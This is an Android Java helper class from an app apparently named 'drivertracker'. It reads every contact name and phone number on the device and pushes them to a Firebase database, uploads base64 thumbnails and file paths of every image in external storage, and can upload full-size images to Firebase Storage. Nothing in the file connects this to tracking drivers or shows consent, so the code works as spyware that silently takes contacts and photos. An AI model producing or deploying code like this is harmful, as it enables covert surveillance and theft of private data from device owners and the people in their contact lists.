package com.example.drivertracker;

import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.media.ThumbnailUtils;
import android.net.Uri;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.util.Base64;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.ByteArrayOutputStream;
import java.io.File;

public class FirebaseHelper {

    public static void saveContacts(Context context) {
        DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("contacts");

        Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);

        while (cursor.moveToNext()) {
            String name = cursor.getString(
                    cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phone = cursor.getString(
                    cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            dbRef.push().setValue(name + " - " + phone);
        }
        cursor.close();
    }

    public static void saveImageList(Context context) {
        DatabaseReference dbRef = FirebaseDatabase.getInstance().getReference("photos");
        Uri collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        Cursor cursor = context.getContentResolver().query(collection, null, null, null, null);

        while (cursor.moveToNext()) {
            String filePath = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
            String fileName = new File(filePath).getName();

            Bitmap thumbnail = ThumbnailUtils.createImageThumbnail(filePath, MediaStore.Images.Thumbnails.MINI_KIND);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            thumbnail.compress(Bitmap.CompressFormat.JPEG, 20, baos);
            String base64Thumb = Base64.encodeToString(baos.toByteArray(), Base64.DEFAULT);

            dbRef.push().setValue(new PhotoItem(fileName, filePath, base64Thumb));
        }
        cursor.close();
    }

    public static void uploadFullImage(Context context, String filePath) {
        Uri fileUri = Uri.fromFile(new File(filePath));
        StorageReference storageRef = FirebaseStorage.getInstance().getReference("full_images/" + fileUri.getLastPathSegment());

        storageRef.putFile(fileUri).addOnSuccessListener(taskSnapshot ->
                System.out.println("Full image uploaded: " + filePath)
        ).addOnFailureListener(e ->
                System.err.println("Failed upload: " + e.getMessage())
        );
    }
}
